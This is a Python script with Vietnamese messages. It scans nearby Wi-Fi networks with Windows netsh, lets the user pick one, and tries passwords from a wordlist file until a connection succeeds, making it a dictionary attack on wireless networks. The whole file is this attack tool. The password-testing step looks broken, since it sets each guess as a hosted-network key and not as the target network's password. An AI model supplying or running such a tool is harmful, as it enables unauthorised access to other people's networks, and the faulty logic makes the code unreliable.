import subprocess

error = ["Card Wifi Đang Tắt"]

def set_hosted(ssid , passw):
    subprocess.run(['netsh', 'wlan', 'set', 'hostednetwork' , 'mode=', 'allow', 'ssid=', str(ssid), 'key=', str(passw)])
    subprocess.run(['netsh', 'wlan', 'start', 'hostednetwork'])

def get_temple_pass():
    f = open("temple_pass.txt",'r+')
    list_pass = f.readlines()
    new = [element.rstrip() for element in list_pass] #remove /n in the last word
    return new

def find_ssids():
    ssids = []
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'network'])
        data_decode = data.decode("ascii").replace("\r","")
        profile = data_decode.split("\n")[4:]
        x = 0
        for i in profile:
            if x % 5 == 0:
                ssids.append(profile[x])
            x+=1
        for result in ssids:
            print(result)
    except:
        ssids.append(error[0])
    return ssids

def get_name_ssid_chosed(ssids, ssid):
    ssid_chosed = (''.join(ssids[int(ssid) - 1])).split(':')
    return ssid_chosed[1][1::]

def handle_connect(ssid, passw):
    for i in passw:
        set_hosted(ssid, i)
        conn = subprocess.run(['netsh', 'wlan', 'connect', 'name=',ssid, 'ssid=',ssid])
        if conn.returncode == 0:
            print ("Bạn đã kết nối với wifi : " + ssid + " với password là : " + i)
            return 1
        else : 
            print ("pass : " + i + " sai")
def main():
    ssids = find_ssids()
    if ssids == error:
        print(error[0])
    elif len(ssids) > 2:
        print("Tìm Xong")
        ssid = input("Chọn ssid bạn muốn kết nối : ")
        ssid_chosed = get_name_ssid_chosed(ssids, ssid)
        passw = get_temple_pass()
        handle_connect(ssid_chosed, passw)
    else:
       ssid_connected = (''.join(ssids[0])).split(':')
       print("Bạn đã kết nối với wifi : " + ssid_connected[1])
if __name__ == "__main__":
    main()



